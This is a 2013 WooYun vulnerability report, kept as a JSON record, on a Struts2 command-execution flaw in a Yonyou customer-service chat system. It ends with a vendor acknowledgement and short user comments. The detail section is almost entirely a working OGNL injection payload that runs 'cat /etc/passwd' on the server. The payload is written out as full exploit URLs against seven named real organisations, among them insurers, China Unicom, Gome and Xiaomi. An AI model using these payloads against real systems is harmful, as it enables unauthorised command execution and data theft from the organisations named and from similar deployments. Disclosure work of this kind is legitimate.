{"id": 8888, "wybug_id": "wooyun-2013-031383", "wybug_title": "用友某产品Struts命令执行漏洞（可导致金融、保险、基金等行业用户受到影响）", "wybug_corp": "用友软件", "wybug_author": "Finger", "wybug_date": "2013-07-19 19:21", "wybug_open_date": "2013-10-17 19:22", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-17：\t细节向公众公开  简要描述： 用友客服系统某产品命令执行漏洞（涉及金融、保险、基金等行业用户） 详细说明：  用友的客服系统存在最新的struts命令执行漏洞 涉及金融、保险、基金等行业用户中国大地保险\nhttp://im.95590.cn:7002/web/icc/chat/chat?redirectAction:${%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(%22cat%22),%23xx%3dnew%20java.lang.String(%22/etc/passwd%22),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}\n中国人保财险\nhttp://im.e-picc.com.cn/web/icc/chat/chat?redirectAction:${%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(%22cat%22),%23xx%3dnew%20java.lang.String(%22/etc/passwd%22),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}\n中国联通\nhttp://help.10010.com/web/icc/chat/chat?redirectAction:${%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(%22cat%22),%23xx%3dnew%20java.lang.String(%22/etc/passwd%22),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}\n华泰柏瑞基金\nhttp://online.huatai-pb.com:7009/web/ucc/chat/chat?redirectAction:${%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(%22cat%22),%23xx%3dnew%20java.lang.String(%22/etc/passwd%22),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}\n国美电器\nhttp://onlinechat.gome.com.cn/web/icc/chat/chat?redirectAction:${%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(%22cat%22),%23xx%3dnew%20java.lang.String(%22/etc/passwd%22),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}\n小米手机\nhttp://online.kefu.xiaomi.com/web/icc/chat/chat?redirectAction:${%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(%22cat%22),%23xx%3dnew%20java.lang.String(%22/etc/passwd%22),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}\n江西中小企业公共服务平台网络\nhttp://111.75.198.122/web/icc/chat/chat?redirectAction:${%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(%22cat%22),%23xx%3dnew%20java.lang.String(%22/etc/passwd%22),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 Finger@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-07-22 08:18 厂商回复： 此问题正在修复，非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-19 19:23 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-07-19 19:25 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  mark    \n     2013-07-19 20:00 |    \t\t党中央 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | 中国共产党全国代表大会产生的中央权力机构...)\t\t \n  kraM    \n     2013-07-19 20:11 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  @党中央  你又跑出来捣乱，抓起来关到笼子去。    \n     2013-07-19 20:56 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  呵呵    \n     2013-07-19 22:04 |    \t\tHilbert \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 今晚打老虎)\t\t \n  mark    \n     2013-07-20 00:12 |    \t\t小色 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 撸的一手好管)\t\t \n  mark    \n     2013-07-20 00:59 |    \t\tSlcio \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 白帽)\t\t \n  不用mark了。。。Struts2的产品。。。比如小米某。。。    \n     2013-07-30 17:39 |    \t\tsolar-fly \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | I am fly , so I can fly !)\t\t \n  mark    \n     2013-10-17 20:56 |    \t\t小权 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 小菜鸟，求各位大姐大哥多多指教)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}